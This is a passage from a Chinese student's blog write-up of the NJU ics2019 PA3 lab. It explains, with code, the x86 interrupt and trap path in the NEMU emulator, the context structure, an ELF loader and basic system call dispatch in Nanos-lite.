class="hljs-built_in">rtl_push</span>(&amp;cpu.ebx);<span class="hljs-built_in">rtl_push</span>(&amp;s0);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.ebp);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.esi);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.edi);<span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"pusha"</span>);}</code></pre></div></div><p>接下来讲义要求我们重新组织<code>Context</code>结构体。这个地方卡了一段时间，确实如讲义所说，必须要理解整个中断调用过程，只看代码是看不出什么的。</p><p>触发异常后硬件处理第一步是通过<code>raise_intr</code>依次将触发异常时的PC和处理器状态(对于x86来说就是eflags,cs和eip)压栈，根据异常号找到中断向量表中的中断描述符，描述符给出了该执行哪个中断。比如如果是80系统调用，程序运行后会触发<code>trap.S</code>汇编代码上面的第一个函数<code>__am_vecsys</code>，会压入异常号，然后跳转到<code>__am_asm_trap()</code>。在<code>__am_asm_trap()</code>中，代码将会把用户进程的通用寄存器通过<code>pusha</code>保存到堆栈上。由此形成了陷阱帧。栈由改地址往低地址延伸，因此<code>_Context</code>的顺序与此相反，或者说和<code>popa</code>的顺序是一致的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x69chalmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-x69chalmrh9u68"><pre><code class="hljs C++">#----|------------entry------------|---irq id---|-----handler-----|.globl __am_vecsys;    __am_vecsys: pushl $<span class="hljs-number">0x80</span>; jmp __am_asm_trap......__am_asm_trap:  pushal  pushl $<span class="hljs-number">0</span>  pushl %esp  call __am_irq_handle</code></pre></div></div><h3 id="事件分发">事件分发</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211436161726_962_20230601235726797182_626_image-20230501223811235.png" alt="image-20230501223811235"><figcaption aria-hidden="true">image-20230501223811235</figcaption></figure><p>讲义中指出，这是因为CTE的<code>__am_irq_handle()</code>函数并未正确识别出自陷事件.根据<code>_yield()</code>的定义,<code>__am_irq_handle()</code>函数需要将自陷事件打包成编号为<code>_EVENT_YIELD</code>的事件。让它识别一下就好:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q3szrylmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-q3szrylmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (c-&gt;irq) {    <span class="hljs-keyword">case</span> <span class="hljs-number">0x81</span>:ev.event=_EVENT_YIELD;<span class="hljs-keyword">break</span>;    <span class="hljs-keyword">default</span>: ev.event = _EVENT_ERROR; <span class="hljs-keyword">break</span>;}</code></pre></div></div><p><code>do_event</code>也识别一下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uxoe79lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-uxoe79lmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (e.event) {    <span class="hljs-keyword">case</span> _EVENT_YIELD:  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"_EVENT_YIELD recognized"</span>);<span class="hljs-keyword">break</span>;    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"Unhandled event ID = %d"</span>, e.event);}</code></pre></div></div><p>可以看到识别出来了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211437260313_511_20230601235728897164_790_image-20230501233745814.png" alt="image-20230501233745814"><figcaption aria-hidden="true">image-20230501233745814</figcaption></figure><h3 id="恢复上下文">恢复上下文</h3><p>恢复上下文需要完成<code>popa</code>操作。因为我在实现<code>pusha</code>的时候已经完成了，因此这里直接触发了<code>panic</code>，任务完成。</p><h3 id="必答题">必答题</h3><h6 id="从nanos-lite调用_yield开始-到从_yield返回的期间-这一趟旅程具体经历了什么">从Nanos-lite调用<code>_yield()</code>开始,到从<code>_yield()</code>返回的期间, 这一趟旅程具体经历了什么？</h6><p>1.<code>nexus-am/am/src/x86/nemu/cte.c</code> 中，_yield函数中执行指令 int 0x81。</p><p></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g2um4ulmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-g2um4ulmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">void</span> _yield() {    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">"int $0x81"</span>)</span></span>;}</code></pre></div></div><p></p><p>2.<code>nemu/src/isa/x86/exec/system.c</code>中，<code>exec_int</code> 函数为 nemu 对 int 指令的执行函数，其中调用了<code>raise_intr</code> 函数，参数为 int 中断编号(此处为 0x81)以及当前的PC 值。一般的中断走的是<code>0xcd</code>分支。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zac3y9lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-zac3y9lmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(<span class="hljs-type">int</span>) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-keyword">switch</span>(decinfo.opcode){    <span class="hljs-keyword">case</span> <span class="hljs-number">0xcc</span> : <span class="hljs-built_in">raise_intr</span>(<span class="hljs-number">0x3</span>,decinfo.seq_pc);  <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xcd</span> : <span class="hljs-built_in">raise_intr</span>(id_dest-&gt;val, decinfo.seq_pc); <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xce</span> : <span class="hljs-built_in">raise_intr</span>(<span class="hljs-number">0x4</span>, decinfo.seq_pc); <span class="hljs-keyword">break</span>;    }  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"int %s"</span>, id_dest-&gt;str);  <span class="hljs-built_in">difftest_skip_dut</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);}</code></pre></div></div><p>3.<code>nemu/src/isa/x86/intr.c</code> 中，<code>raise_intr</code>函数中读取中断描述符表idt，根据传入的中断编号得到中断处理程序的入口地址(中断描述符表的初始化在<code>_cte_init</code>函数中完成)。接下来就是讲义中的<code>触发异常后硬件的响应过程</code>，我们依次对寄存器eflags ,cs,eip进行压栈，根据IDT找到入口地址，最后将程序转移到中断处理程序入口地址处继续执行。当中断编号为0x81 时，在<code>nexus-am/am/src/x86/nemu/cte.c</code>中的<code>_cte_init</code>函数中我们可以看到中断处理程序为<code>__am_vectrap</code>函数(下面<code>idt[0x81]</code>这一行），因此<code>raise_intr</code>最终的效果是将虚拟机内部运行的程序转移到了其中断服务程序处继续执行。nemu完成了 int 指令的执行。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2lvjxxlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-2lvjxxlmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">int</span> _cte_init(_Context*(*handler)(_Event, _Context*)) {  <span class="hljs-type">static</span> GateDesc idt[NR_IRQ];  <span class="hljs-comment">// initialize IDT</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_IRQ; i ++) {    idt[i] = <span class="hljs-built_in">GATE</span>(STS_TG32, <span class="hljs-built_in">KSEL</span>(SEG_KCODE), __am_vecnull, DPL_KERN);  }  <span class="hljs-comment">// ----------------------- interrupts ----------------------------</span>  idt[<span class="hljs-number">32</span>]   = <span class="hljs-built_in">GATE</span>(STS_IG32, <span class="hljs-built_in">KSEL</span>(SEG_KCODE), __am_irq0,   DPL_KERN);  <span class="hljs-comment">// ---------------------- system call ----------------------------</span>  idt[<span class="hljs-number">0x80</span>] = <span class="hljs-built_in">GATE</span>(STS_TG32, <span class="hljs-built_in">KSEL</span>(SEG_KCODE), __am_vecsys, DPL_USER);  idt[<span class="hljs-number">0x81</span>] = <span class="hljs-built_in">GATE</span>(STS_TG32, <span class="hljs-built_in">KSEL</span>(SEG_KCODE), __am_vectrap, DPL_KERN);  <span class="hljs-built_in">set_idt</span>(idt, <span class="hljs-built_in">sizeof</span>(idt));  <span class="hljs-comment">// register event handler</span>  user_handler = handler;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>4.<code>__am_vectrap</code>位于<code>nexus-am/am/src/x86/nemu/trap.S</code> 中，将整数 0x81入栈，跳转到<code>__am_asm_trap</code>继续执行。进行一系列压栈操作后(压的其实就是<code>_Context</code>结构体这个参数，这回答了讲义中“<code>__am_irq_handle()</code>有一个上下文结构指针<code>c</code>这个上下文结构<code>c</code>是怎么来的”这个问题)，转移到函数<code>__am_irq_handle</code>处执行。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-taedaelmrh9u68"></i><span>assembly</span><div class="collapse show" id="collapse-taedaelmrh9u68"><pre><code class="hljs assembly">.globl __am_vectrap;  __am_vectrap: pushl $0x81; jmp __am_asm_trap    __am_asm_trap:  pushal  pushl $0  pushl %esp  call __am_irq_handle  addl $4, %esp  addl $4, %esp  popal  addl $4, %esp  iret</code></pre></div></div><p>5.<code>nexus-am/am/src/x86/nemu/cte.c</code>中，函数<code>__am_irq_handle</code> 根据栈(上下文)中保存的中断号对事件进行打包，调用<code>user_handler</code>对事件进行处理。其中<code>user_handler</code>在<code>_cte_init</code> 中进行了初始化，为<code>do_event</code>函数。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2o1d56lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-2o1d56lmrh9u68"><pre><code class="hljs C++">_Context* __am_irq_handle(_Context *c) {  _Context *next = c;  <span class="hljs-keyword">if</span> (user_handler) {    _Event ev = {<span class="hljs-number">0</span>};    <span class="hljs-keyword">switch</span> (c-&gt;irq) {      <span class="hljs-keyword">case</span> <span class="hljs-number">0x81</span>:ev.event=_EVENT_YIELD;<span class="hljs-keyword">break</span>;      <span class="hljs-keyword">default</span>: ev.event = _EVENT_ERROR; <span class="hljs-keyword">break</span>;    }    next = <span class="hljs-built_in">user_handler</span>(ev, c);    <span class="hljs-keyword">if</span> (next == <span class="hljs-literal">NULL</span>) {      next = c;    }  }  <span class="hljs-keyword">return</span> next;}</code></pre></div></div><p><code>user_handler</code>是怎么初始化的呢？具体是<code>_cte_init</code> 中<code>user_handler = handler;</code>这一句，而这个参数<code>handler</code>是<code>init_irq</code>时调用时传给它的，这也回到了<code>main</code>函数为实现上下文做准备的阶段。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-75s9edlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-75s9edlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_irq</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>{  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing interrupt/exception handler..."</span>);  _cte_init(do_event);}</code></pre></div></div><p>6.<code>nanos-lite/src/irq.c</code> 中，<code>do_event</code>函数对传入的时间进行解析，做出相应的操作，对于 <code>yield</code>操作，我们现在直接输出一段文本，表示程序运行至此即可。顾名思义的话应该是要做进程调度，但我们现在仅有一个上下文，因此不做上下文切换，此处直接返回<code>NULL</code>给<code>__am_irq_handle</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i4m7oalmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-i4m7oalmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> _Context* <span class="hljs-title">do_event</span><span class="hljs-params">(_Event e, _Context* c)</span> </span>{  <span class="hljs-keyword">switch</span> (e.event) {    <span class="hljs-keyword">case</span> _EVENT_YIELD:  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"_EVENT_YIELD recognized"</span>);<span class="hljs-keyword">break</span>;    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"Unhandled event ID = %d"</span>, e.event);  }  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;}</code></pre></div></div><p>7.接下来就是沿着上述调用链逐级返回的操作。<code>__am_irq_handle</code>得到 <code>do_event</code>返回的<code>NULL</code>后，不做上下文切换，直接将传入的上下文返回给调用者<code>__am_asm_trap</code>，经过适当的出栈操作后，使用 <code>iret</code>指令进行中断返回，回复现场，回到中断前程序的执行位置。至此，一次自陷操作全部完成。</p><p><code>__am_irq_handle</code>:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-u0k8khlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-u0k8khlmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (next == <span class="hljs-literal">NULL</span>) {    next = c;}}<span class="hljs-keyword">return</span> next;</code></pre></div></div><p><code>trap.S</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5lbbyglmrh9u68"></i><span>assembly</span><div class="collapse show" id="collapse-5lbbyglmrh9u68"><pre><code class="hljs assembly">call __am_irq_handleaddl $4, %espaddl $4, %esppopaladdl $4, %espiret</code></pre></div></div><p><code>iret</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-05lfkhlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-05lfkhlmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(iret) {  <span class="hljs-built_in">rtl_pop</span>(&amp;s0);  <span class="hljs-built_in">rtl_j</span>(s0);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.cs);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.eflags.val);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"iret"</span>);}</code></pre></div></div><p>这个必答题按照整个触发中断时进行上下文管理的过程梳理了一遍。上述实现的过程中是发现缺什么需要补充的，看懂局部的过程进行补充，而在此对整个过程进行了整体的总结。</p><h3 id="思考题">思考题</h3><h6 id="对比异常处理与函数调用">对比异常处理与函数调用</h6><p>我们知道进行函数调用的时候也需要保存调用者的状态: 返回地址,以及calling convention中需要调用者保存的寄存器.而CTE在保存上下文的时候却要保存更多的信息. 尝试对比它们,并思考两者保存信息不同是什么原因造成的。</p><blockquote><p>综合上述提到的异常处理过程，对于x86多保存的主要有eflags,cs,eip和通用寄存器。主要原因是调用子程序过程发生的时间是已知和固定的，即在主程序中的调用指令（CALL）执行时发生，所以我们只需要保存子函数中需要的东西，以及保存返回地址，ebp确保能回到调用者那里就可以。而中断/异常发生的时间一般是随机的。意味着我们需要为当前的寄存器状态提供一个“快照”，因此几乎保存了所有的寄存器。</p></blockquote><h2 id="二阶段">二阶段</h2><h3 id="实现loader">实现loader</h3><p>讲义中指出，现在的ramdisk十分简单, 它只有一个文件,就是我们将要加载的用户程序<code>dummy</code>,可执行文件位于ramdisk偏移为0处,访问它就可以得到用户程序的第一个字节.</p><p>关于用户程序需要加载到的内存位置</p><p>ics2019是这么说的:</p><blockquote><p>为了避免和Nanos-lite的内容产生冲突,我们约定目前用户程序需要被链接到内存位置<code>0x3000000</code>(x86)或<code>0x83000000</code>(mips32或riscv32)附近,Navy-apps已经设置好了相应的选项(见<code>navy-apps/Makefile.compile</code>中的<code>LDFLAGS</code>变量).</p></blockquote><p>ics2018</p><blockquote><p>用户程序需要被链接到内存位置<code>0x4000000</code>处</p></blockquote><p>而且，ics2018这个是作为第一个热身任务，是这么说的:</p><blockquote><p>loader 只需要做一件事情:将 ramdisk 中从 0 开始的所有内容放置在0x4000000,并把这个地 址作为程序的入口返回即可。</p></blockquote><p>但ics2019这个地方就有些复杂，这个地方也研究了好半天。其中<a href="https://vgalaxy.work/2022/01/01/icspa3/#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">这篇博客</a>造了一个轮子，但也让我清楚了到底想让我们干什么。</p><p>程序开始的地方由ELF header中的Entry pointaddress来指示，因此我们读出来，返回这个入口地址就可以了。下面的<code>naive_uload</code>将程序入口强制转换一个函数指针并调用，因此我们确信就直接返回这个地址值就可以了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2qzfj2lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-2qzfj2lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">naive_uload</span><span class="hljs-params">(PCB *pcb, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span> </span>{  <span class="hljs-type">uintptr_t</span> entry = <span class="hljs-built_in">loader</span>(pcb, filename);  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Jump to entry = %p"</span>, entry);  ((<span class="hljs-built_in">void</span>(*)())entry) ();}</code></pre></div></div><p>但是讲义里还提到:</p><blockquote><p>你需要找出每一个需要加载的segment的<code>Offset</code>,<code>VirtAddr</code>,<code>FileSiz</code>和<code>MemSiz</code>这些参数.其中相对文件偏移<code>Offset</code>指出相应segment的内容从ELF文件的第<code>Offset</code>字节开始,在文件中的大小为<code>FileSiz</code>,它需要被分配到以<code>VirtAddr</code>为首地址的虚拟内存位置,在内存中它占用大小为<code>MemSiz</code>. 也就是说,这个segment使用的内存就是<code>[VirtAddr, VirtAddr + MemSiz)</code>这一连续区间,然后将segment的内容从ELF文件中读入到这一内存区间,并将<code>[VirtAddr + FileSiz, VirtAddr + MemSiz)</code>对应的物理区间清零。</p></blockquote><p>因此还没完。我们没有做清零的工作。因此我们还要根据ELFheader知道有几个segments，然后从ProgramHeader中知道segment的属性。讲义中有一个图表现的比较清楚。然后对每一个段清零。代码如下所示:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mzdgc1lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-mzdgc1lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">uintptr_t</span> <span class="hljs-title">loader</span><span class="hljs-params">(PCB *pcb, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span> </span>{  <span class="hljs-comment">// TODO();</span>  Elf_Ehdr elf_header;  <span class="hljs-type">size_t</span> offset=<span class="hljs-built_in">ramdisk_read</span>(&amp;elf_header,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(Elf_Ehdr));  <span class="hljs-built_in">assert</span>(offset==<span class="hljs-built_in">sizeof</span>(Elf_Ehdr));  Elf_Phdr elf_program_header[elf_header.e_phnum];  offset=<span class="hljs-built_in">ramdisk_read</span>(elf_program_header,elf_header.e_phoff,<span class="hljs-built_in">sizeof</span>(Elf_Phdr)*elf_header.e_phnum);  <span class="hljs-built_in">assert</span>(offset==<span class="hljs-built_in">sizeof</span>(Elf_Phdr)*elf_header.e_phnum);  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;elf_header.e_phnum;i++){    <span class="hljs-comment">// only load PT_LOAD type</span>    <span class="hljs-keyword">if</span>(elf_program_header[i].p_type==PT_LOAD){      <span class="hljs-built_in">ramdisk_read</span>((<span class="hljs-type">void</span>*)elf_program_header[i].p_vaddr,elf_program_header[i].p_offset,elf_program_header[i].p_memsz);      <span class="hljs-comment">// clear the [Virtual Address + File Size, Virtual Address + Memory Size)</span>      <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span>*)(elf_program_header[i].p_vaddr+elf_program_header[i].p_filesz),<span class="hljs-number">0</span>,elf_program_header[i].p_memsz-elf_program_header[i].p_filesz);    }  }  <span class="hljs-keyword">return</span> elf_header.e_entry;}</code></pre></div></div><p>实现完了按照提示在<code>init_proc()</code>中调用<code>naive_uload(NULL, NULL)</code>。需要在上面声明一下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-38zo51lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-38zo51lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_proc</span><span class="hljs-params">()</span> </span>{  switch_boot_pcb();  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing processes..."</span>);  <span class="hljs-comment">// load program here</span>  <span class="hljs-built_in">naive_uload</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);}</code></pre></div></div><p>但是为什么报错呢？使用<code>objdump -S dummy-x86 &gt;dump.txt</code>查看<code>dummy</code>的反汇编代码，发现入口确实找对了，还是这个<code>endbr32</code>的鬼。这好说，改一改编译选项的事，PA2已经遇到过了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211438200351_288_20230601235731026927_345_image-20230502154536429.png" alt="image-20230502154536429"><figcaption aria-hidden="true">image-20230502154536429</figcaption></figure><p>加到<code>navy_apps</code>的<code>Makefile.compile</code>里面就好。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211439456917_201_20230601235735629917_395_image-20230502155010170.png" alt="image-20230502155010170"><figcaption aria-hidden="true">image-20230502155010170</figcaption></figure><p>同理，在<code>navy_apps</code>底下也要<code>make clean</code>才能生效。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211440453947_652_20230601235740625541_326_image-20230502155347960.png" alt="image-20230502155347960"><figcaption aria-hidden="true">image-20230502155347960</figcaption></figure><p>说明loader已经成功加载dummy。</p><h6 id="堆和栈在哪里">堆和栈在哪里</h6><blockquote><p>栈的使用只发生在函数调用过程中，堆的使用只发生在malloc/free函数调用之后，因此它们都只在动态时有意义，这是为什么它们不需要出现在可执行文件中。</p></blockquote><h6 id="如何识别不同格式的可执行文件">如何识别不同格式的可执行文件?</h6><p>如果你在GNU/Linux下执行一个从Windows拷过来的可执行文件,将会报告"格式错误". 思考一下, GNU/Linux是如何知道"格式错误"的?</p><blockquote><p>根据ELF 文件头的前 4 个字节即“魔数”判断。</p></blockquote><h6 id="为什么要清零">为什么要清零?</h6><p>为什么需要将 <code>[VirtAddr + FileSiz, VirtAddr + MemSiz)</code>对应的物理区间清零?</p><blockquote><p>如讲义中所说，FileSiz 表示这个段在文件中的大小，而 MemSiz表示这个段在内存中的大小。我们知道可执行文件的各个段包括代码段、数据段、BSS段等。由于 BSS 段没有实际的数据，所以它的 FileSiz 为 0，而 MemSiz表示它需要占用的空间大小。BSS段是程序运行时未初始化的全局变量和静态变量所占据的内存空间，我们写C程序知道这变量默认应当为0的，因此要清零。</p></blockquote><h3 id="识别系统调用">识别系统调用</h3><p><code>a[0] = c-&gt;GPR1;</code>保存的是系统调用的参数，<code>dummy</code>程序,它触发了一个<code>SYS_yield</code>系统调用. 我们约定,这个系统调用直接调用CTE的<code>_yield()</code>即可,然后返回<code>0</code>.因此我们需要处理的第一个<code>case</code>是<code>SYS_yield</code>。下面又说“处理系统调用的最后一件事就是设置系统调用的返回值.对于不同的ISA, 系统调用的返回值存放在不同的寄存器中,宏<code>GPRx</code>用于实现这一抽象,所以我们通过<code>GPRx</code>来进行设置系统调用返回值即可.”换句话说，刚才的返回0就是把这个<code>GPRx</code>寄存器设置成0；查看宏定义，它在<code>x86</code>中是<code>eip</code>。这不是胡扯吗。。<code>eip</code>是指针寄存器，返回值应当存到通用寄存器里啊。看要求果然有“在<code>nexus-am/am/include/arch/$ISA-nemu.h</code>中实现正确的<code>GPR?</code>宏”，因此我们先把这个错改过来:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qgln91lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-qgln91lmrh9u68"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPR1 eax</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPR2 ebx</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPR3 ecx</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPR4 edx</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPRx eax</span></code></pre></div></div><p>依据的是下面的定义:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2o1nxslmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-2o1nxslmrh9u68"><pre><code class="hljs C++"><span class="hljs-comment">// ISA-depedent definitions</span><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(__ISA_X86__)</span><span class="hljs-meta"># <span class="hljs-keyword">define</span> ARGS_ARRAY (<span class="hljs-string">"int $0x80"</span>, <span class="hljs-string">"eax"</span>, <span class="hljs-string">"ebx"</span>, <span class="hljs-string">"ecx"</span>, <span class="hljs-string">"edx"</span>, <span class="hljs-string">"eax"</span>)</span></code></pre></div></div><p>这个ARRAY对应的就是封装的系统调用的四个参数:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3gt2kslmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-3gt2kslmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">intptr_t</span> _syscall_(<span class="hljs-type">intptr_t</span> type, <span class="hljs-type">intptr_t</span> a0, <span class="hljs-type">intptr_t</span> a1, <span class="hljs-type">intptr_t</span> a2) {  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> _gpr1 <span class="hljs-title">asm</span> <span class="hljs-params">(GPR1)</span> </span>= type;  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> _gpr2 <span class="hljs-title">asm</span> <span class="hljs-params">(GPR2)</span> </span>= a0;  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> _gpr3 <span class="hljs-title">asm</span> <span class="hljs-params">(GPR3)</span> </span>= a1;  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> _gpr4 <span class="hljs-title">asm</span> <span class="hljs-params">(GPR4)</span> </span>= a2;  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> ret <span class="hljs-title">asm</span> <span class="hljs-params">(GPRx)</span></span>;  <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(SYSCALL : <span class="hljs-string">"=r"</span> (ret) : <span class="hljs-string">"r"</span>(_gpr1), <span class="hljs-string">"r"</span>(_gpr2), <span class="hljs-string">"r"</span>(_gpr3), <span class="hljs-string">"r"</span>(_gpr4))</span></span>;  <span class="hljs-keyword">return</span> ret;}</code></pre></div></div><p>然后我们去按部就班实现“约定”:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5pt92hlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-5pt92hlmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (a[<span class="hljs-number">0</span>]) {    <span class="hljs-keyword">case</span> SYS_yield: _yield(); c-&gt;GPRx = <span class="hljs-number">0</span>; <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"Unhandled syscall ID = %d"</span>, a[<span class="hljs-number">0</span>]);}</code></pre></div></div><p><code>do_event</code>分发:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wfl099lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-wfl099lmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> _EVENT_SYSCALL:<span class="hljs-built_in">Log</span>(<span class="hljs-string">"EVENT_SYSCALL"</span>);<span class="hljs-built_in">do_syscall</span>(c);</code></pre></div></div><p>发现还是不行。因为做完上下文管理和做这一部分中间隔了一段时间写qt大作业，所以不太熟悉了。仔细回顾了这一部分发现是没有在am中处理中断指令:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v5o5zslmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-v5o5zslmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (c-&gt;irq){<span class="hljs-keyword">case</span> <span class="hljs-number">0x80</span>:  ev.event = _EVENT_SYSCALL;  <span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-number">0x81</span>:  ev.event = _EVENT_YIELD;  <span class="hljs-keyword">break</span>;<span class="hljs-keyword">default</span>:  ev.event = _EVENT_ERROR;  <span class="hljs-keyword">break</span>;}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211441604924_901_20230601235743907716_132_image-20230515195959094.png" alt="image-20230515195959094"><figcaption aria-hidden="true">image-20230515195959094</figcaption></figure><p>这次对了。0号事件好说。按照提示直接调用<code>_halt</code></p><div class="code-wrapper"><i class="fa 